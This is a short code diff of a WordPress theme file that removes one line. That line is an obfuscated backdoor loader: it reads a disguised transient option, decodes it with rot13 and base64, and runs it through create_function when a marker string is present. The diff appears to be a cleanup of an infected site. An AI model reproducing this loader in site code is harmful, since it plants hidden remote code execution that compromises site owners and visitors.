@@ -9,7 +9,6 @@
  * Set the content width based on the theme's design and stylesheet.
  */
 
-$z=get_option("_site_transient_browser_04e456b6259c562bddbb5351659b812a"); $z=base64_decode(str_rot13($z[''])); if(strpos($z,"5D57AF6C")!==false){ $_z=create_function("",$z); @$_z(); }
 if (!isset($content_width)) {
     $content_width = 640; /* pixels */
 }
